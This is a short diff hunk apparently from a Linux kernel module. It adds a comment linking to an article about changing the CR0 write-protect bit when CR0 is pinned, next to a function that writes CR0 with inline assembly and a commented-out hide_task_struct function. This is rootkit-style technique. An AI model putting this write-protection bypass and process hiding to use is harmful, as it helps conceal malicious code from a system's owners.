@@ -74,6 +74,8 @@ static void hide_task_struct(void)
 		}
 }**/
 
+
+// https://hadfiabdelmoumene.medium.com/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411
 static void write_cr0_pinned(uint64_t value)
 {
 		asm volatile("mov %0, %%cr0": "+r"(value), "+m"(__force_order));
